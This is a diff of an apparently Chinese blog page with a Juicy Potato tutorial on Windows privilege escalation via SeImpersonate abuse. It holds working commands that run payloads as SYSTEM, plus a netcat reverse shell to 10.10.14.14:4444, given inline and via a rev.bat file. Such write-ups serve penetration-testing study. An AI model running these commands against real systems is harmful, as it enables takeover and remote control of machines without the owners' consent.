@@ -13,13 +13,13 @@
 <meta property="og:site_name" content="Twe1ve&#39;s Blog">
 <meta property="og:description" content="项目地址：https:&#x2F;&#x2F;github.com&#x2F;ohpe&#x2F;juicy-potato&#x2F; 0x01、前言Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广 利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用 whoami &#x2F;pri   ##查找Se">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/1.jpg">
-<meta property="og:image" content="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/2.jpg">
+<meta property="og:image" content="https://github.com/images/1.jpg">
+<meta property="og:image" content="https://github.com/images/2.jpg">
 <meta property="article:published_time" content="2020-04-22T06:52:56.000Z">
-<meta property="article:modified_time" content="2020-04-22T07:45:53.120Z">
+<meta property="article:modified_time" content="2020-04-22T08:02:26.383Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/1.jpg">
+<meta name="twitter:image" content="https://github.com/images/1.jpg">
   
     <link rel="icon" href="/images/icon.png">
   
@@ -135,7 +135,7 @@
 <h1 id="0x01、前言"><a href="#0x01、前言" class="headerlink" title="0x01、前言"></a>0x01、前言</h1><p>Juicy Potato是在工具RottenPotatoNG （ms16-075提权exe）的基础上的扩展，使用更方便，使用范围也更广</p>
 <p>利用的前提是获得了SeImpersonate或者SeAssignPrimaryToken权限，通常在webshell下使用</p>
 <p>whoami /pri   ##查找SeImpersonate and/or SeAssignPrimaryToken</p>
-<p><img src="/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/1.jpg" alt> </p>
+<p><img src="/images/1.jpg" alt></p>
 <h1 id="0x02、JuicyPotato功能"><a href="#0x02、JuicyPotato功能" class="headerlink" title="0x02、JuicyPotato功能"></a>0x02、JuicyPotato功能</h1><p><strong>自主选择CLSID</strong></p>
 <p>-c ‘clsid’         #### clsid查找：<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a> </p>
 <p><strong>自定义COM监听端口</strong></p>
@@ -157,7 +157,7 @@
 <h1 id="0x03、JuicyPotato使用"><a href="#0x03、JuicyPotato使用" class="headerlink" title="0x03、JuicyPotato使用"></a>0x03、JuicyPotato使用</h1><h2 id="依赖于clsid："><a href="#依赖于clsid：" class="headerlink" title="依赖于clsid："></a>依赖于clsid：</h2><pre><code>PS C:\users\userpool\desktop&gt; ./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c whoami&quot; -t *
 Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 COM -&gt; recv failed with error: 10038</code></pre><p>查找替换<a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener">http://ohpe.it/juicy-potato/CLSID/</a>  很幸运2012 Standard中的第一条就成功了：</p>
-<pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p><img src="/Twe1ve-web/Twe1ve-web.github.io/2020/04/22/JuicyPotato%E6%8F%90%E6%9D%83/../JuicyPotato%E6%8F%90%E6%9D%83/2.jpg" alt> </p>
+<pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;whoami&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p><img src="/images/2.jpg" alt></p>
 <h2 id="反弹shell："><a href="#反弹shell：" class="headerlink" title="反弹shell："></a>反弹shell：</h2><pre><code>./juicypotato.exe  -l 1337 -p c:\windows\system32\cmd.exe -a &quot;/c c:\users\userpool\desktop\nc.exe -e cmd.exe 10.10.14.14 4444&quot; -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>或者将paylaod写入bat，-p参数执行bat</p>
 <pre><code>echo &apos;C:\users\userpool\nc.exe -e cmd.exe 10.10.14.14 4444&apos; &gt; rev.bat
 ./juicypotato.exe  -l 1337 -p c:\users\userpool\desktop\rev.bat -t * -c &apos;{e60687f7-01a1-40aa-86ac-db1cbf673334}&apos;</code></pre><p>RDP下提权：直接弹出一个system权限窗口</p>
